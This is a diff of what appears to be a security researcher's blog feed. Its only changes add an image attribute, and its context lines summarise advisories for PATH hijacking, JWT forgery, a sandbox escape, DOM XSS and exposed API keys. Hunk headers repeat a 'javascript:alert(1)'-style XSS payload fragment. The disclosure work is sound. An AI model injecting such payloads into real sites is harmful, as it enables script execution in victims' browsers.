-                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--01_11_42-AM-5.png" alt="" width="1672" height="941" loading="lazy"></figure></figure>
+                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--01_11_42-AM-5.png" alt="" width="1672" height="941" loading="lazy" data-is-external-image="true"></figure></figure>
 <h2 dir="ltr">Overview</h2>
 <p dir="ltr"><strong>CVE-2026-48097</strong> is a high-severity vulnerability affecting NexTOR IP Changer. The issue originated from unsafe command execution practices that relied on executable resolution through the system <code spellcheck="false">PATH</code> environment variable.</p>
 <p dir="ltr">Under specific conditions, an attacker capable of influencing the execution environment could cause the application to invoke attacker-controlled binaries instead of legitimate system utilities.</p>
@@ -1696,7 +1695,7 @@ script:alert(1)')"&gt;
             </summary>
         <content type="html">
             <![CDATA[
-                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--01_11_42-AM-4.png" alt="" width="1672" height="941" loading="lazy"></figure></figure>
+                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--01_11_42-AM-4.png" alt="" width="1672" height="941" loading="lazy" data-is-external-image="true"></figure></figure>
 <h2 dir="ltr">Overview</h2>
 <p dir="ltr"><strong>CVE-2026-44720</strong> is a moderate-severity authentication vulnerability affecting OpenLearnX. Under certain authentication flows, insufficient JWT signature verification could allow attackers to supply forged authentication tokens and bypass normal identity validation.</p>
 <p dir="ltr">The issue originated from improper enforcement of cryptographic verification during token processing, creating a scenario where attacker-controlled JWTs could be accepted as valid.</p>
@@ -1791,7 +1790,7 @@ script:alert(1)')"&gt;
             </summary>
         <content type="html">
             <![CDATA[
-                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--01_11_42-AM-3.png" alt="" width="1672" height="941" loading="lazy"></figure></figure>
+                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--01_11_42-AM-3.png" alt="" width="1672" height="941" loading="lazy" data-is-external-image="true"></figure></figure>
 <h2 dir="ltr">Overview</h2>
 <p dir="ltr"><strong>CVE-2026-41900</strong> is a high-severity vulnerability affecting the Python execution environment of OpenLearnX. The issue allowed a crafted payload to escape the intended execution sandbox, potentially leading to arbitrary command execution on the underlying host system.</p>
 <p dir="ltr">The vulnerability originated from insufficient restrictions around the sandbox environment and inadequate enforcement of security boundaries between user-supplied code and privileged system resources.</p>
@@ -1877,7 +1876,7 @@ script:alert(1)')"&gt;
             </summary>
         <content type="html">
             <![CDATA[
-                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--01_11_42-AM-2.png" alt="" width="1672" height="941" loading="lazy"></figure></figure>
+                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--01_11_42-AM-2.png" alt="" width="1672" height="941" loading="lazy" data-is-external-image="true"></figure></figure>
 <h2 dir="ltr">Overview</h2>
 <p dir="ltr"><strong>CVE-2026-41575</strong> is a moderate-severity DOM-Based Cross-Site Scripting (XSS) vulnerability affecting the IP Reputation Checker application.</p>
 <p dir="ltr">The issue originated from insufficient sanitization of user-controlled input before it was inserted into the Document Object Model (DOM). An attacker could craft malicious input containing executable JavaScript, causing arbitrary script execution within the victim's browser context.</p>
@@ -1952,7 +1951,7 @@ script:alert(1)')"&gt;
             </summary>
         <content type="html">
             <![CDATA[
-                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--01_11_42-AM-1.png" alt="" width="1672" height="941" loading="lazy"></figure></figure>
+                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--01_11_42-AM-1.png" alt="" width="1672" height="941" loading="lazy" data-is-external-image="true"></figure></figure>
 <h2 dir="ltr">Overview</h2>
 <p dir="ltr"><strong>CVE-2026-32138</strong> is a high-severity vulnerability affecting the Nexulean Website. The issue resulted from the exposure of Firebase and Web3Forms API credentials through publicly accessible client-side resources.</p>
 <p dir="ltr">Although certain frontend service identifiers are intended to be public, exposed credentials combined with insufficient restrictions may allow attackers to interact directly with backend services or abuse integrated third-party platforms.</p>
